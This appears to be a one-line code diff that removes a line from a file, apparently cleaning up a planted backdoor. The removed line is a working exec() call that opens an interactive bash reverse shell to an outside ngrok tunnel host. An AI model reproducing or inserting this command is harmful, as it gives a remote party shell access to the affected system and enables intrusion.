@@ -1,1 +1,0 @@
-<pre>exec("/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/17088 0>&1'");</pre>
